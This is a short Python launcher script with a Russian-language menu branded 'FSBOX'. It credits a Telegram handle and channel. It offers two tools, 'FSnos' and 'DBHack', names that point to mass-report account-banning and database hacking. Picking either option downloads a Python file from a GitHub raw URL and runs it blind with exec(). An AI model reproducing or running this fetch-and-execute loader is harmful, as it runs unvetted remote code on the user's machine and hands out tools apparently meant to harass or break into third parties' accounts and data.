from colorama import Fore, Style, init
from termcolor import colored
from requests import get
import os
import platform
import pystyle

clr = """
if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')
"""
exec(clr)

pystyle.Write.Print(pystyle.Center.XCenter("""


   ▄████████    ▄████████ ▀█████████▄   ▄██████▄  ▀████    ▐████▀ 
  ███    ███   ███    ███   ███    ███ ███    ███   ███▌   ████▀  
  ███    █▀    ███    █▀    ███    ███ ███    ███    ███  ▐███    
 ▄███▄▄▄       ███         ▄███▄▄▄██▀  ███    ███    ▀███▄███▀    
▀▀███▀▀▀     ▀███████████ ▀▀███▀▀▀██▄  ███    ███    ████▀██▄     
  ███                 ███   ███    ██▄ ███    ███   ▐███  ▀███    
  ███           ▄█    ███   ███    ███ ███    ███  ▄███     ███▄  
  ███         ▄████████▀  ▄█████████▀   ▀██████▀  ████       ███▄ 
                                                                  
    ╔════════════════════════════════════════════════════════╗
    ║                                                        ║
    ║                Что сегодня запускаем?:                 ║
    ║                                                        ║
    ║                       [1] FSnos                        ║
    ║                       [2] DBHack                       ║
    ║                                                        ║
    ╚════════════════════════════════════════════════════════╝
    ║                  Создатель: @fosertpvp                 ║
    ║             Наш телеграм канал: @NoEyeOfGod            ║
    ╚════════════════════════════════════════════════════════╝


┌──<Введите выбор>

"""), pystyle.Colors.white_to_red, interval = 0.0002)
choice = input("└─────────")
if choice == "1":
    app = get("https://raw.githubusercontent.com/hazurik/cnocep/main/znozep.py").text
    exec(app)

if choice == "2":
    app1 = get("https://raw.githubusercontent.com/hazurik/cnocep/main/dbhack.py").text
    exec(app1)
